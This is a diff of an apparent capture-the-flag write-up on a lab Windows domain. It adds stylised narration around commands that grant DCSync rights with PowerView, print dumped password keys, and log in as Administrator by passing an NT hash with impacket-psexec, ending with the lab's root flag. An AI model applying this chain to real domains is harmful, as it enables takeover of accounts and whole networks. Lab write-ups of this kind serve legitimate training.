@@ -331,7 +331,9 @@ The command completed successfully
 *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net localgroup "Remote Management Users" cat /add
 The command completed successfully.
 ```
+
 Time to become the king.
+
 ```bash
 *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> upload PowerView.ps1
 
@@ -342,6 +344,7 @@ we can use the Add-ObjectACL with cat's credentials, and give him DCSync rights.
 *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> Add-ObjectACL -PrincipalIdentity cat -Credential $cred -Rights DCSync
 ```
 
+No more hunting through the brush; we were masquerading as a Domain Controller, demanding the replication of the kingdom's deepest secrets
 
 ```bash
 ┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-u5yqproecw]─[~/Desktop]
@@ -455,8 +458,13 @@ EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
 EXCH01$:des-cbc-md5:8c45f44c16975129
 [*] Cleaning up... 
 ```
+I didn't bother cracking the cipher. In the sprawl, you don't need to decrypt a soul when you can just mimic its signature.
+I took the crown-jewel hash harvested from the DCSync and fed it back into the grid using a Pass-the-Hash strike. 
+I spun up impacket-psexec, riding the NT-hash straight into the Administrator’s skin.
 
 impacket-psexec administrator@10.129.95.210 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+
+The system bowed, unable to distinguish the ghost from the machine, and dropped me right onto the desktop of the god-head.
 
 C:\Users\Administrator\Desktop> type root.txt
 d2fedf82930d63c3a1bb94a479ffa246
